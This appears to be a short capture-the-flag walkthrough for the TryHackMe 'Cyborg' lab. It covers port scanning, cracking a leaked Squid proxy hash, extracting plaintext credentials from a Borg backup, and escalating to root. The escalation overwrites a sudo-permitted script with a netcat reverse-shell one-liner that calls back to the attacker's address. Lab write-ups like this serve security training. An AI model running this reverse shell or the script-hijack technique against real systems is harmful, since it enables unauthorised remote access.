# Cyborg 

> VOiD | Monday 27 December 2021 05:49:36 AM UTC

My IP : 10.8.253.221
Target IP : 10.10.187.224


```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```


## PORT 80 [http]

/squid/config
```bash
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```
/squid/passwd
```bash
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
using john
squidward        (music_archive)
```

```bash
borg extract home/field/dev/final_archive::music_archive
Enter passphrase for key /home/void/tryhackme/Cyborg/home/field/dev/final_archive:
squidward

┌──(void㉿kali)-[~/…/Cyborg/home/alex/Documents]
└─$ cat note.txt 
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3

```

## PORT 22 [ssh]
```bash
alex@ubuntu:~$ cat user.txt 
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

chmod 777 /etc/mp3backups/backup.sh
echo "rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.253.221 4444 >/tmp/f" > /etc/mp3backups/backup.sh
sudo /etc/mp3backups/backup.sh

> # cat root.txt
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}

```